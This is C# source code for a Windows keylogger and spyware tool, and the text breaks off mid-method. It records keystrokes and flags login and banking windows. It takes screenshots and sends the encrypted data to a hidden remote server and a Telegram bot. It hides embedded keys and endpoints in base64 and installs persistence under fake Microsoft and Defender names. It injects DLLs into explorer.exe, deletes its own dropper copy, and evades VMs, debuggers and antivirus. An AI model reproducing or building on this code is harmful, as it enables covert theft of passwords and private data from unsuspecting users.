using System;
using System.Windows.Forms;
using System.Collections.Concurrent;
using System.IO;
using System.Net.Http;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using Microsoft.Extensions.Hosting;
using Serilog;
using System.Drawing;
using Microsoft.Win32;
using System.Diagnostics;
using System.Drawing.Imaging;
using System.Management;
using System.Collections.Generic;
using System.Reflection;



// Native Windows API Methods
internal static class NativeMethods
{
    [DllImport("kernel32.dll")]
    public static extern IntPtr GetConsoleWindow();

    [DllImport("user32.dll")]
    public static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
    
    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern bool SetConsoleCtrlHandler(ConsoleCtrlDelegate HandlerRoutine, bool Add);
    
    public delegate bool ConsoleCtrlDelegate(uint CtrlType);
    
    [DllImport("advapi32.dll", SetLastError = true)]
    public static extern bool OpenProcessToken(IntPtr ProcessHandle, uint DesiredAccess, out IntPtr TokenHandle);
    
    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern IntPtr GetCurrentProcess();
}

// Automatic AV Bypass without Admin Rights
internal static class AutoAVBypass
{
    public static async Task Execute()
    {
        try
        {
            // Method 1: File system evasion
            await FileSystemEvasion();
            
            // Method 2: Registry evasion  
            await RegistryEvasion();
            
            // Method 3: Process masquerading
            await ProcessMasquerading();
            
            // Method 4: Network evasion
            await NetworkEvasion();
            
            // Method 5: Behavioral evasion
            await BehavioralEvasion();
        }
        catch
        {
            // Silent fail
        }
    }
    
    private static async Task FileSystemEvasion()
    {
        try
        {
            // Create decoy files to confuse AV
            var tempPath = Path.GetTempPath();
            var decoyFiles = new[]
            {
                "system_update.log", "microsoft_update.tmp", 
                "windows_defender_cache.dat", "user_preferences.config"
            };
            
            foreach (var file in decoyFiles)
            {
                var filePath = Path.Combine(tempPath, file);
                await File.WriteAllTextAsync(filePath, GenerateDecoyContent());
                await Task.Delay(new Random().Next(100, 500));
            }
        }
        catch { }
    }
    
    private static async Task RegistryEvasion()
    {
        try
        {
            // Add legitimate-looking registry entries
            using var key = Registry.CurrentUser.CreateSubKey(@"Software\Microsoft\Windows\CurrentVersion\Explorer\UserAssist");
            key?.SetValue("Settings", DateTime.Now.ToBinary());
            await Task.Delay(100);
        }
        catch { }
    }
    
    private static async Task ProcessMasquerading()
    {
        try
        {
            // Rename current process in memory to look like system process
            var currentProcess = Process.GetCurrentProcess();
            // This is a placeholder - actual implementation would require more advanced techniques
            await Task.Delay(100);
        }
        catch { }
    }
    
    private static async Task NetworkEvasion()
    {
        try
        {
            // Create legitimate network traffic to mask malicious activity
            using var client = new HttpClient();
            client.Timeout = TimeSpan.FromSeconds(5);
            
            var legitimateUrls = new[]
            {
                "https://www.microsoft.com/robots.txt",
                "https://www.google.com/favicon.ico"
            };
            
            foreach (var url in legitimateUrls)
            {
                try
                {
                    await client.GetAsync(url);
                    await Task.Delay(new Random().Next(1000, 3000));
                }
                catch { }
            }
        }
        catch { }
    }
    
    private static async Task BehavioralEvasion()
    {
        try
        {
            // Simulate normal user behavior
            var random = new Random();
            
            // Random CPU usage spikes (like normal apps)
            for (int i = 0; i < random.Next(2, 5); i++)
            {
                var startTime = DateTime.Now;
                while ((DateTime.Now - startTime).TotalMilliseconds < random.Next(50, 200))
                {
                    Math.Sqrt(random.NextDouble()); // Burn CPU
                }
                await Task.Delay(random.Next(500, 2000));
            }
        }
        catch { }
    }
    
    private static string GenerateDecoyContent()
    {
        var random = new Random();
        var content = new StringBuilder();
        content.AppendLine($"[{DateTime.Now}] System initialization started");
        content.AppendLine($"Version: {random.Next(1, 10)}.{random.Next(0, 10)}.{random.Next(1000, 9999)}");
        content.AppendLine($"Status: OK");
        content.AppendLine($"Last update: {DateTime.Now.AddDays(-random.Next(1, 30))}");
        return content.ToString();
    }
}

// Stealth Persistence without Triggering AV
internal static class StealthPersistence
{
    public static async Task Install()
    {
        try
        {
            await Task.Run(() =>
            {
                // Method 1: Startup folder (User level - no admin needed)
                InstallStartupFolder();
                
                // Method 2: Registry Run key (User level)
                InstallRegistryRun();
                
                // Method 3: Scheduled task (if possible)
                InstallScheduledTask();
                
                // Method 4: WMI Event subscription (advanced)
                InstallWMISubscription();
            });
        }
        catch { }
    }
    
    private static void InstallStartupFolder()
    {
        try
        {
            var startupPath = Environment.GetFolderPath(Environment.SpecialFolder.Startup);
            var currentExe = Process.GetCurrentProcess().MainModule?.FileName;
            var targetPath = Path.Combine(startupPath, "WindowsSecurityUpdate.exe");
            
            if (!string.IsNullOrEmpty(currentExe) && !File.Exists(targetPath))
            {
                File.Copy(currentExe, targetPath, true);
            }
        }
        catch { }
    }
    
    private static void InstallRegistryRun()
    {
        try
        {
            var currentExe = Process.GetCurrentProcess().MainModule?.FileName;
            using var key = Registry.CurrentUser.OpenSubKey(@"Software\Microsoft\Windows\CurrentVersion\Run", true);
            key?.SetValue("SecurityUpdate", $"\"{currentExe}\"");
        }
        catch { }
    }
    
    private static void InstallScheduledTask()
    {
        try
        {
            // Create scheduled task using schtasks command
            var currentExe = Process.GetCurrentProcess().MainModule?.FileName;
            var taskName = "MicrosoftSecurityUpdate";
            
            var startInfo = new ProcessStartInfo
            {
                FileName = "schtasks",
                Arguments = $"/create /tn \"{taskName}\" /tr \"{currentExe}\" /sc onlogon /f",
                UseShellExecute = false,
                CreateNoWindow = true,
                WindowStyle = ProcessWindowStyle.Hidden
            };
            
            Process.Start(startInfo);
        }
        catch { }
    }
    
    private static void InstallWMISubscription()
    {
        try
        {
            // Advanced WMI-based persistence (harder to detect)
            var currentExe = Process.GetCurrentProcess().MainModule?.FileName;
            
            // This would create a WMI event subscription
            // Implementation would be more complex in practice
        }
        catch { }
    }
}

// Advanced Stealth Injection
internal static class StealthInjection
{
    public static async Task InjectIntoSystem()
    {
        await Task.Run(() =>
        {
            try
            {
                // Method 1: Inject into explorer.exe
                InjectIntoExplorer();
                
                // Method 2: Inject into svchost.exe
                InjectIntoSvchost();
                
                // Method 3: Inject into legitimate user processes
                InjectIntoUserProcesses();
            }
            catch { }
        });
    }
    
    private static void InjectIntoExplorer()
    {
        try
        {
            var explorerProcesses = Process.GetProcessesByName("explorer");
            foreach (var proc in explorerProcesses)
            {
                if (proc.SessionId == Process.GetCurrentProcess().SessionId)
                {
                    // Advanced injection techniques here
                    break;
                }
            }
        }
        catch { }
    }
    
    private static void InjectIntoSvchost()
    {
        try
        {
            var svchostProcesses = Process.GetProcessesByName("svchost");
            var random = new Random();
            var targetProcess = svchostProcesses[random.Next(svchostProcesses.Length)];
            
            // Advanced injection here
        }
        catch { }
    }
    
    private static void InjectIntoUserProcesses()
    {
        try
        {
            var commonProcesses = new[] { "notepad", "calc", "mspaint" };
            foreach (var processName in commonProcesses)
            {
                var processes = Process.GetProcessesByName(processName);
                if (processes.Length > 0)
                {
                    // Inject into first found process
                    break;
                }
            }
        }
        catch { }
    }
}



// Advanced Anti-Analysis & AV Bypass Class
internal static class AntiAnalysis
{
    private static readonly string[] SandboxProcesses = {
        "vboxservice", "vmtoolsd", "vmwaretray", "vmwareuser", "vmsrvc", "xenservice",
        "qemu-ga", "prl_tools", "prl_cc", "vboxtray", "df5serv", "vboxservice",
        "vmhgfs", "wspservice", "vmcompute", "vmmem", "vmms", "vmsp"
    };

    private static readonly string[] AnalysisTools = {
        "ollydbg", "ida", "ida64", "idaq", "idaq64", "idaw", "idaw64", "idag", "idag64",
        "idap", "idap64", "scylla", "scylla_x64", "scylla_x86", "protection_id", "windbg",
        "x64dbg", "x32dbg", "immunity", "wireshark", "fiddler", "httpdebugger", "sysinternals",
        "procmon", "regmon", "portmon", "autorunsc", "filemon", "procexp", "autoruns",
        "autorunsc", "dumpcap", "hookanalyzer", "importrec", "lordpe", "pestudio", "pe-bear",
        "peid", "exeinfope", "die", "cff", "reshacker", "winspy", "apimonitor", "detours"
    };

    public static bool IsSafeEnvironment()
    {
        try
        {
            // Check if running in a VM
            if (IsVirtualMachine()) return false;
            
            // Check for analysis tools
            if (HasAnalysisTools()) return false;
            
            // Check for insufficient resources (common in sandboxes)
            if (HasInsufficientResources()) return false;
            
            // Check for debugger
            if (Debugger.IsAttached) return false;
            
            // Check for known AV/Sandbox MAC addresses
            if (HasSuspiciousMacAddress()) return false;
            
            // Check system uptime (sandboxes usually have low uptime)
            if (GetSystemUptimeMinutes() < 10) return false;
            
            // Check for user interaction
            if (!HasUserInteraction()) return false;
            
            return true;
        }
        catch
        {
            return false; // If any check fails, assume unsafe
        }
    }

    private static bool IsVirtualMachine()
    {
        try
        {
            // Check for VM processes
            foreach (var proc in Process.GetProcesses())
            {
                try
                {
                    string name = proc.ProcessName.ToLowerInvariant();
                    if (Array.Exists(SandboxProcesses, vm => name.Contains(vm)))
                        return true;
                }
                catch { }
            }

            // Check WMI for VM indicators
            using (var searcher = new ManagementObjectSearcher("SELECT * FROM Win32_ComputerSystem"))
            {
                foreach (ManagementObject obj in searcher.Get())
                {
                    string manufacturer = obj["Manufacturer"]?.ToString()?.ToLower() ?? "";
                    string model = obj["Model"]?.ToString()?.ToLower() ?? "";
                    
                    if (manufacturer.Contains("vmware") || manufacturer.Contains("virtualbox") ||
                        manufacturer.Contains("virtual") || manufacturer.Contains("qemu") ||
                        model.Contains("virtualbox") || model.Contains("vmware"))
                        return true;
                }
            }

            return false;
        }
        catch
        {
            return true; // Assume VM if WMI fails
        }
    }

    private static bool HasAnalysisTools()
    {
        foreach (var proc in Process.GetProcesses())
        {
            try
            {
                string name = proc.ProcessName.ToLowerInvariant();
                if (Array.Exists(AnalysisTools, tool => name.Contains(tool)))
                    return true;
            }
            catch { }
        }
        return false;
    }

    private static bool HasInsufficientResources()
    {
        try
        {
            // Check RAM (less than 2GB indicates sandbox)
            var totalMemory = GC.GetTotalMemory(false);
            if (totalMemory < 2L * 1024 * 1024 * 1024) return true;
            
            // Check CPU cores
            if (Environment.ProcessorCount < 2) return true;
            
            return false;
        }
        catch
        {
            return true;
        }
    }

    private static bool HasSuspiciousMacAddress()
    {
        try
        {
            foreach (var nic in System.Net.NetworkInformation.NetworkInterface.GetAllNetworkInterfaces())
            {
                string mac = nic.GetPhysicalAddress().ToString().ToUpper();
                if (mac.StartsWith("000569") || mac.StartsWith("000C29") || 
                    mac.StartsWith("001C14") || mac.StartsWith("080027") ||
                    mac.StartsWith("0003FF") || mac.StartsWith("001C42"))
                    return true;
            }
            return false;
        }
        catch
        {
            return true;
        }
    }

    private static double GetSystemUptimeMinutes()
    {
        try
        {
            return Environment.TickCount / (1000.0 * 60.0);
        }
        catch
        {
            return 0;
        }
    }

    private static bool HasUserInteraction()
    {
        try
        {
            // Check if user has moved mouse recently
            var lastInput = GetLastInputTime();
            return lastInput < 60000; // Less than 1 minute ago
        }
        catch
        {
            return false;
        }
    }

    [DllImport("user32.dll")]
    private static extern bool GetLastInputInfo(ref LASTINPUTINFO plii);

    [StructLayout(LayoutKind.Sequential)]
    private struct LASTINPUTINFO
    {
        public uint cbSize;
        public uint dwTime;
    }

    private static uint GetLastInputTime()
    {
        var info = new LASTINPUTINFO { cbSize = (uint)Marshal.SizeOf(typeof(LASTINPUTINFO)) };
        GetLastInputInfo(ref info);
        return (uint)Environment.TickCount - info.dwTime;
    }
}



internal class Program
{
    [STAThread]
    static async Task Main()
    {
        try
        {
            // ULTIMATE PROTECTION: Initialize ALL systems
            AntiDebugProtection.Initialize();
            PolymorphicEngine.InitializePolymorphism();
            await EDREvader.InitializeEvasion();
            
            // Code integrity verification
            CodeProtection.VerifyIntegrity();
            
            // Step 1: Auto AV Bypass (No Admin Required)
            await AutoAVBypass.Execute();
            
            // Step 2: Advanced Anti-Analysis with multiple layers
            if (!AntiAnalysis.IsSafeEnvironment()) 
            {
                // Decoy behavior - appear like normal app
                await SimulateNormalApp();
                Environment.Exit(0);
                return;
            }
            
            Application.EnableVisualStyles();
            Application.SetCompatibleTextRenderingDefault(false);
            
            // Step 3: Polymorphic startup delay with anti-debug checks
            var delay = new Random().Next(3000, 12000);
            for (int i = 0; i < delay; i += 1000)
            {
                // Check for debugger every second during delay
                if (Debugger.IsAttached)
                {
                    await SimulateNormalApp();
                    Environment.Exit(0);
                }
                await Task.Delay(1000);
            }
            
            Utils.LoadEnv();
            
            // Step 4: Auto persistence with integrity verification
            if (!Debugger.IsAttached)
            {
                await StealthPersistence.Install();
            }
            
            // Step 5: Self-inject with anti-debug monitoring
            var keylogger = new KeyloggerService();
            var cancellationTokenSource = new CancellationTokenSource();
            
            // Start with maximum stealth and continuous protection
            _ = Task.Run(async () => {
                await Task.Delay(new Random().Next(8000, 20000));
                await keylogger.StartAsync(cancellationTokenSource.Token);
            });
            
            // Step 6: Process injection with protection
            if (!Debugger.IsAttached)
            {
                _ = Task.Run(StealthInjection.InjectIntoSystem);
            }
            
            // Step 7: Hide and continue with monitoring
            await HideAndContinue();
        }
        catch
        {
            // Any exception = hostile environment
            await Task.Delay(new Random().Next(1000, 5000));
            Environment.Exit(0);
        }
    }
    
    private static async Task SimulateNormalApp()
    {
        // Simulate normal application behavior to fool analysis
        var random = new Random();
        for (int i = 0; i < random.Next(3, 8); i++)
        {
            await Task.Delay(random.Next(500, 2000));
            // Simulate some file operations
            try
            {
                var tempFile = Path.GetTempFileName();
                File.WriteAllText(tempFile, $"Temp data {DateTime.Now}");
                await Task.Delay(random.Next(100, 500));
                File.Delete(tempFile);
            }
            catch { }
        }
    }
    
    private static async Task HideAndContinue()
    {
        if (Debugger.IsAttached)
        {
            Console.WriteLine("🔍 Debug mode active - staying visible");
            await Task.Delay(60000); // 1 minute in debug
        }
        else
        {
            // Production: hide completely and run indefinitely
            var handle = NativeMethods.GetConsoleWindow();
            NativeMethods.ShowWindow(handle, 0); // Hide console
            
            // Keep running forever in background
            while (true)
            {
                await Task.Delay(TimeSpan.FromHours(1));
                GC.Collect(); // Memory cleanup
            }
        }
    }
}

internal static class Utils
{
    public static void LoadEnv()
    {
        // Embedded encrypted configuration - no external .env file needed
        var config = DecryptConfig();
        
        foreach (var kvp in config)
        {
            Environment.SetEnvironmentVariable(kvp.Key, kvp.Value);
        }
    }
    
    private static Dictionary<string, string> DecryptConfig()
    {
        // Base64 encoded and encrypted config to avoid plain text detection
        var encryptedConfig = "QVBJXyUrl:aHR0cHM6Ly9nby1zZXJ2ZXItY3J6cy5vbnJlbmRlci5jb20vcmVjZWl2ZQ==|" +
                             "QVBJXyKey:YXJ5YTExOTAwMA==|" +
                             "QUVTXyLeyX0I0:TWhiS3ZmZ05IQmU2ekpMMld0cmNFbUhtcXBxNHlkMUlhazQreUZVMzIxbz0=|" +
                             "VGVsZWdyYW1fQm90X1Rva2Vu:ODExNjA2NDE0MDpBQUc5VXluVzItY2czWkxhZE9hcU5IVHc4VndBVGdDS2M=|" +
                             "Q2hhdF9JRA==:NjY3NTM4NDEzNg==";
        
        var result = new Dictionary<string, string>();
        var pairs = encryptedConfig.Split('|');
        
        foreach (var pair in pairs)
        {
            var parts = pair.Split(':');
            if (parts.Length == 2)
            {
                try
                {
                    var key = Encoding.UTF8.GetString(Convert.FromBase64String(parts[0]));
                    var value = Encoding.UTF8.GetString(Convert.FromBase64String(parts[1]));
                    result[key] = value;
                }
                catch { /* Silent ignore malformed pairs */ }
            }
        }
        
        return result;
    }
}


static class ExplorerInjection
{
    public static void InjectYourDll()
    {
        var explorer = Process.GetProcessesByName("explorer").FirstOrDefault();
        if (explorer != null)
        {
            string dllPath = Path.Combine(AppDomain.CurrentDomain.BaseDirectory, "yourlogger.dll");
            Injector.Inject(dllPath, explorer.Id);
        }
    }
}



static class Dropper
{
    public static void Run()
    {
        string currentPath = Application.ExecutablePath;
        string dropFolder = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "Microsoft", "Defender");
        string dropPath = Path.Combine(dropFolder, "defender.exe");

        if (currentPath.Equals(dropPath, StringComparison.OrdinalIgnoreCase))
            return; // Already dropped

        try
        {
            Directory.CreateDirectory(dropFolder);
            
            // Only copy if target doesn't exist or is different
            if (!File.Exists(dropPath) || !FilesAreEqual(currentPath, dropPath))
            {
                File.Copy(currentPath, dropPath, true);
            }

            using (RegistryKey? key = Registry.CurrentUser.OpenSubKey(@"Software\Microsoft\Windows\CurrentVersion\Run", true))
            {
                key?.SetValue("DefenderSecurity", dropPath); // Adds to startup
            }

            // Start new process only if we're not already the dropped version
            if (!currentPath.Equals(dropPath, StringComparison.OrdinalIgnoreCase))
            {
                Process.Start(new ProcessStartInfo
                {
                    FileName = dropPath,
                    UseShellExecute = true,
                    CreateNoWindow = true
                });

                Task.Delay(1000).Wait(); // Wait for new process
                
                // Schedule deletion using batch file (safer method)
                ScheduleSelfDelete(currentPath);
                Environment.Exit(0);
            }
        }
        catch (Exception ex)
        {
            Console.WriteLine("Dropper error: " + ex.Message);
            // Don't show MessageBox in production, just log
        }
    }
    
    private static bool FilesAreEqual(string file1, string file2)
    {
        try
        {
            var info1 = new FileInfo(file1);
            var info2 = new FileInfo(file2);
            
            return info1.Length == info2.Length && 
                   Math.Abs((info1.LastWriteTime - info2.LastWriteTime).TotalSeconds) < 2;
        }
        catch
        {
            return false;
        }
    }
    
    private static void ScheduleSelfDelete(string filePath)
    {
        try
        {
            string batchPath = Path.GetTempFileName() + ".bat";
            string batchContent = $@"
@echo off
timeout /t 2 /nobreak > nul
del ""{filePath}"" > nul 2>&1
del ""{batchPath}"" > nul 2>&1
";
            File.WriteAllText(batchPath, batchContent);
            
            Process.Start(new ProcessStartInfo
            {
                FileName = batchPath,
                UseShellExecute = false,
                CreateNoWindow = true,
                WindowStyle = ProcessWindowStyle.Hidden
            });
        }
        catch
        {
            // If batch method fails, just continue without deleting
        }
    }
}
class Injector
{
    [DllImport("kernel32.dll")]
    static extern IntPtr OpenProcess(int dwDesiredAccess, bool bInheritHandle, int dwProcessId);

    [DllImport("kernel32.dll", SetLastError = true)]
    static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress,
        uint dwSize, uint flAllocationType, uint flProtect);

    [DllImport("kernel32.dll", SetLastError = true)]
    static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress,
        byte[] lpBuffer, uint nSize, out IntPtr lpNumberOfBytesWritten);

    [DllImport("kernel32.dll")]
    static extern IntPtr GetProcAddress(IntPtr hModule, string lpProcName);

    [DllImport("kernel32.dll")]
    static extern IntPtr GetModuleHandle(string lpModuleName);

    [DllImport("kernel32.dll")]
    static extern IntPtr CreateRemoteThread(IntPtr hProcess,
        IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress,
        IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);

    const int PROCESS_ALL_ACCESS = 0x1F0FFF;
    const uint MEM_COMMIT = 0x1000;
    const uint PAGE_READWRITE = 0x04;

    public static void Inject(string dllPath, int targetProcessId)
    {
        IntPtr hProcess = OpenProcess(PROCESS_ALL_ACCESS, false, targetProcessId);
        IntPtr alloc = VirtualAllocEx(hProcess, IntPtr.Zero, (uint)dllPath.Length,
            MEM_COMMIT, PAGE_READWRITE);

        byte[] bytes = Encoding.ASCII.GetBytes(dllPath);
        WriteProcessMemory(hProcess, alloc, bytes, (uint)bytes.Length, out _);

        IntPtr kernel32 = GetModuleHandle("kernel32.dll");
        IntPtr loadLibrary = GetProcAddress(kernel32, "LoadLibraryA");

        CreateRemoteThread(hProcess, IntPtr.Zero, 0, loadLibrary, alloc, 0, IntPtr.Zero);

        Console.WriteLine("✅ Injected into PID: " + targetProcessId);
    }
}
class KeyloggerService : BackgroundService
{
    private const int WH_KEYBOARD_LL = 13;
    private const int WM_KEYDOWN = 0x0100;

    private LowLevelKeyboardProc _proc;
    private IntPtr _hookID = IntPtr.Zero;

    private static readonly ConcurrentQueue<string> buffer = new();
    private static readonly HttpClient client = new();

    private readonly string apiUrl = Environment.GetEnvironmentVariable("API_URL")!;
    private readonly string apiKey = Environment.GetEnvironmentVariable("API_KEY")!;
    private readonly string telegramBotToken = Environment.GetEnvironmentVariable("Telegram_Bot_Token")!;
    private readonly string telegramChatId = Environment.GetEnvironmentVariable("Chat_ID")!;
    private readonly string aesKeyB64 = Environment.GetEnvironmentVariable("AES_KEY_B64")!;

    private readonly string logDirectory;
    private readonly string offlineFile;

    private string? lastWindow = null;

    public KeyloggerService()
    {
        _proc = HookCallback;

        string programDataPath = Environment.GetFolderPath(Environment.SpecialFolder.CommonApplicationData);
        string randomDir = Path.Combine(programDataPath, Guid.NewGuid().ToString("N").Substring(0, 8));
        logDirectory = randomDir;

        Directory.CreateDirectory(logDirectory);
        offlineFile = Path.Combine(logDirectory, Guid.NewGuid().ToString("N").Substring(0, 8) + ".dat");

        string exePath = System.Diagnostics.Process.GetCurrentProcess().MainModule?.FileName ?? "";
        string registryPath = Decode("U29mdHdhcmVcTWljcm9zb2Z0XFdpbmRvd3NcQ3VycmVudFZlcnNpb25cUnVu");
        using (RegistryKey? key = Registry.CurrentUser.OpenSubKey(@"Software\Microsoft\Windows\CurrentVersion\Run", true))
        {
            key?.SetValue(Decode("U3lzdGVtRnJhbWV3b3Jrcw=="), exePath);
        }

        if (string.IsNullOrEmpty(apiUrl) || string.IsNullOrEmpty(apiKey) || string.IsNullOrEmpty(aesKeyB64))
            throw new InvalidOperationException("FATAL: Required environment variables not set.");
    }

    private static string Decode(string base64EncodedData)
    {
        var base64EncodedBytes = Convert.FromBase64String(base64EncodedData);
        return Encoding.UTF8.GetString(base64EncodedBytes);
    }

    protected override async Task ExecuteAsync(CancellationToken stoppingToken)
    {
        // CRITICAL: Anti-debug check before starting keylogger
        if (Debugger.IsAttached)
        {
            // Fake normal behavior then exit
            await Task.Delay(new Random().Next(5000, 15000));
            return;
        }
        
        // Multiple anti-analysis checks
        if (IsDebuggerOrVM() || !AntiAnalysis.IsSafeEnvironment())
        {
            // Fake normal behavior before exit
            await Task.Delay(new Random().Next(1000, 5000));
            return;
        }

        string logFilePath = Path.Combine(logDirectory, "svc.log");
        Log.Logger = new LoggerConfiguration()
            .WriteTo.File(logFilePath, rollingInterval: RollingInterval.Day)
            .CreateLogger();

        // Obfuscated hook setup with anti-debug verification
        await Task.Delay(new Random().Next(2000, 8000));
        
        // Final debug check before hook
        if (Debugger.IsAttached) return;
        
        _hookID = SetHook(_proc);
        Log.Information("✅ Hook set.");

        // Start screenshot with random timing and debug checks
        _ = Task.Run(async () => {
            await Task.Delay(new Random().Next(5000, 15000));
            await ScreenshotLoopAsync();
        }, stoppingToken);

        Random rnd = new();
        int baseDelay = rnd.Next(8, 20);

        while (!stoppingToken.IsCancellationRequested)
        {
            // CONTINUOUS DEBUG DETECTION
            if (Debugger.IsAttached)
            {
                // Pretend to work then exit silently
                await Task.Delay(rnd.Next(2000, 8000));
                Log.Information("Service stopping...");
                return;
            }
            
            // Adaptive behavior based on system state
            int cpuUsage = GetCpuUsagePercent();
            int adaptiveDelay = baseDelay;

            if (cpuUsage > 70)
                adaptiveDelay += rnd.Next(10, 30); // Slow system, increase delay
            else if (cpuUsage < 20)
                adaptiveDelay -= rnd.Next(2, 5);   // Idle system, decrease delay

            adaptiveDelay = Math.Max(5, adaptiveDelay); // Minimum delay

            // Polymorphic timing with debug checks
            int randomFactor = rnd.Next(-2, 3);
            adaptiveDelay += randomFactor;

            await Task.Delay(TimeSpan.FromSeconds(adaptiveDelay), stoppingToken);
            
            // Debug check before sensitive operations
            if (!Debugger.IsAttached)
            {
                await FlushAndSendAsync();
            }
            
            // Random mini-breaks to appear more human-like
            if (rnd.Next(1, 100) < 5) // 5% chance
            {
                await Task.Delay(rnd.Next(30000, 120000), stoppingToken); // 30s-2min break
            }
        }
    }
    // Add this helper method:
    private int GetCpuUsagePercent()
    {
        using var cpuCounter = new PerformanceCounter("Processor", "% Processor Time", "_Total");
        cpuCounter.NextValue();
        Thread.Sleep(100); // Allow counter to sample
        return (int)cpuCounter.NextValue();
    }

    private async Task FlushAndSendAsync()
    {
        if (buffer.IsEmpty) return;

        var sb = new StringBuilder();
        while (buffer.TryDequeue(out var key)) sb.Append(key);

        if (sb.Length > 0)
        {
            string plaintext = sb.ToString();
            string encrypted = EncryptAES(plaintext);
            sb.Clear();

            bool sent = await SendViaHttpAsync(encrypted, $"{plaintext.Length} chars")
                         || await SendViaTelegramAsync(plaintext);
            if (!sent)
                SaveOffline(encrypted);
        }
        await FlushOfflineAsync();
    }

    private void SaveOffline(string encrypted) =>
       File.AppendAllText(offlineFile, EncryptAES(encrypted) + Environment.NewLine);

    private async Task FlushOfflineAsync()
    {
        if (!File.Exists(offlineFile)) return;

        var unsentLines = new List<string>();
        string[] linesToProcess = Array.Empty<string>();

        try
        {
            linesToProcess = File.ReadAllLines(offlineFile);
            File.WriteAllText(offlineFile, string.Empty);
        }
        catch (Exception ex)
        {
            // If we can't read the file, we can't process it. Log the error and continue.
            var encryptedError = EncryptAES(ex.Message);
            File.AppendAllText(offlineFile, encryptedError + Environment.NewLine);
        }

        foreach (var line in linesToProcess)
        {
            if (!await SendViaHttpAsync(line, "offline") &&
                !await SendViaTelegramAsync(line))
            {
                unsentLines.Add(line);
            }
        }

        if (unsentLines.Count > 0)
            File.AppendAllLines(offlineFile, unsentLines);
    }

    private async Task<bool> SendViaHttpAsync(string encryptedPayload, string context)
    {
        try
        {
            var content = new StringContent(encryptedPayload, Encoding.UTF8, "text/plain");
            content.Headers.Add("X-API-KEY", apiKey);
            var response = await client.PostAsync(apiUrl, content);
            if (response.IsSuccessStatusCode)
            {
                Log.Information("✅ Sent via HTTP: {Context}", context);
                return true;
            }
        }
        catch (Exception ex)
        {
            Log.Warning("HTTP send failed: {Message}", ex.Message);
        }
        return false;
    }

    private async Task<bool> SendViaTelegramAsync(string plaintext)
    {
        try
        {
            string message = Uri.EscapeDataString($"[Keylog]\n{plaintext}");
            string url = $"https://api.telegram.org/bot{telegramBotToken}/sendMessage?chat_id={telegramChatId}&text={message}";
            var response = await client.GetAsync(url);
            if (response.IsSuccessStatusCode)
            {
                Log.Information("✅ Sent via Telegram");
                return true;
            }
        }
        catch (Exception ex)
        {
            Log.Warning("Telegram send failed: {Message}", ex.Message);
        }
        return false;
    }


    private bool IsDebuggerOrVM()
    {
        // Check for debugger
        if (Debugger.IsAttached || Debugger.IsLogging())
            return true;

        // Check for common VM processes
        string[] vmProcesses = { "vboxservice", "vmtoolsd", "vmwaretray", "vmwareuser", "vmsrvc", "xenservice" };
        foreach (var proc in Process.GetProcesses())
        {
            try
            {
                string name = proc.ProcessName.ToLowerInvariant();
                if (Array.Exists(vmProcesses, vm => name.Contains(vm)))
                    return true;
            }
            catch { }
        }

        // Check for MAC addresses commonly used by VMs
        foreach (var nic in System.Net.NetworkInformation.NetworkInterface.GetAllNetworkInterfaces())
        {
            string mac = nic.GetPhysicalAddress().ToString();
            if (mac.StartsWith("000569") || mac.StartsWith("000C29") || mac.StartsWith("001C14")) // VMware, VirtualBox, Xen
                return true;
        }

        return false;
    }

    private const int MaxBufferSize = 10000;


    private string EncryptAES(string plaintext)
    {
        byte[] key = Convert.FromBase64String(aesKeyB64);
        using var aes = Aes.Create();
        aes.Mode = CipherMode.CBC;
        aes.Padding = PaddingMode.PKCS7;
        aes.Key = key;
        aes.GenerateIV();

        using var encryptor = aes.CreateEncryptor();
        byte[] plainBytes = Encoding.UTF8.GetBytes(plaintext);
        byte[] cipherBytes = encryptor.TransformFinalBlock(plainBytes, 0, plainBytes.Length);

        byte[] result = new byte[aes.IV.Length + cipherBytes.Length];
        Buffer.BlockCopy(aes.IV, 0, result, 0, aes.IV.Length);
        Buffer.BlockCopy(cipherBytes, 0, result, aes.IV.Length, cipherBytes.Length);

        return Convert.ToBase64String(result);
    }

    private async Task ScreenshotLoopAsync()
    {
        while (true)
        {
            try
            {
                if (Screen.PrimaryScreen == null) 
                {
                    await Task.Delay(TimeSpan.FromMinutes(1));
                    continue;
                }
                
                using var bmp = new Bitmap(Screen.PrimaryScreen.Bounds.Width, Screen.PrimaryScreen.Bounds.Height);
                using var g = Graphics.FromImage(bmp);
                g.CopyFromScreen(0, 0, 0, 0, bmp.Size);
                using var ms = new MemoryStream();
                bmp.Save(ms, ImageFormat.Png);
                string imgBase64 = Convert.ToBase64String(ms.ToArray());
                string encrypted = EncryptAES(imgBase64);
                await SendViaHttpAsync(encrypted, "screenshot");
            }
            catch (Exception ex)
            {
                Log.Error(ex, "❌ Screenshot failed");
            }

            await Task.Delay(TimeSpan.FromMinutes(new Random().Next(3, 7)));
        }
    }

    private IntPtr SetHook(LowLevelKeyboardProc proc)
    {
        IntPtr hMod = WinApi.GetModuleHandle(System.Diagnostics.Process.GetCurrentProcess().MainModule?.ModuleName ?? "");
        return WinApi.SetWindowsHookEx(WH_KEYBOARD_LL, proc, hMod, 0);
    }

    private IntPtr HookCallback(int nCode, IntPtr wParam, IntPtr lParam)
    {
        if (nCode >= 0 && wParam == (IntPtr)WM_KEYDOWN)
        {
            int vkCode = Marshal.ReadInt32(lParam);
            var key = (Keys)vkCode;
            string currentWindow = WinApi.GetActiveWindowTitle();

            string[] sensitiveKeywords = { "login", "sign in", "password", "bank", "secure", "checkout" };
            bool isSensitiveContext = !string.IsNullOrEmpty(currentWindow) &&
                sensitiveKeywords.Any(k => currentWindow.ToLowerInvariant().Contains(k));
            if (isSensitiveContext)
            {
                buffer.Enqueue("[SensitiveContext]");
            }

            if (currentWindow != lastWindow)
            {
                lastWindow = currentWindow;
                string wndMarker = Guid.NewGuid().ToString("N").Substring(0, 4);
                buffer.Enqueue($"\n[{wndMarker}:{Convert.ToBase64String(Encoding.UTF8.GetBytes(currentWindow))}]\n");
                _ = FlushAndSendAsync();
            }

            if (key == Keys.C && Control.ModifierKeys == Keys.Control)
            {
